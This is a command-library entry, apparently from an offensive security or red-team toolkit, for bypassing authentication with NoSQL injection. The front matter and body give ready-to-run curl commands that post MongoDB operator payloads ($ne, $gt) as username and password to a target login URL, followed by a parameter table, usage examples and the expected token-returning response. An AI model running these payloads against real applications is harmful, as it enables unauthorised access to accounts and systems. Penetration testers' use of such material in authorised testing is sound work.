---
id: 7955435c-7b58-4bd2-975c-1023aa70ec1c
name: curl-nosql-injection-auth-bypass-json
type: command
executor: bash
data: >-
  curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$ne":
  null}, "password": {"$ne": null}}' $_TARGET_URL

  curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$ne":
  "foo"}, "password": {"$ne": "bar"}}' $_TARGET_URL

  curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$gt":
  undefined}, "password": {"$gt": undefined}}' $_TARGET_URL

  curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$gt":""},
  "password": {"$gt":""}}' $_TARGET_URL
output: null
created_at: '2023-04-06T03:56:31.415064+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - auth-bypass
verified: true
validated: true
---

# curl-nosql-injection-auth-bypass-json

## Command

```bash
curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$ne": null}, "password": {"$ne": null}}' $_TARGET_URL
```

## Description

Sends a JSON HTTP POST request with NoSQL injection payload using MongoDB operators like $ne and $gt to bypass authentication in applications accepting JSON logins.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The login endpoint URL (e.g., http://target.com/login) | Yes |
| -H | Header specification (Content-Type) | Built-in |
| -d | JSON data payload for POST | Built-in |
| -X POST | Specify POST method | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$ne": null}, "password": {"$ne": null}}' http://target.com/login
```

### Advanced Usage

```bash
curl -X POST -H 'Content-Type: application/json' -d '{"username": {"$gt":""}, "password": {"$gt":""}}' http://target.com/login
```

## Expected Output

HTTP/1.1 200 OK
{"status": "success", "token": "xyz789"}

(Indicates bypass success with session token.)

## Related

- [[procedures/NoSQL-Injection-Authentication-Bypass-Using-Not-Equal-or-Greater]]
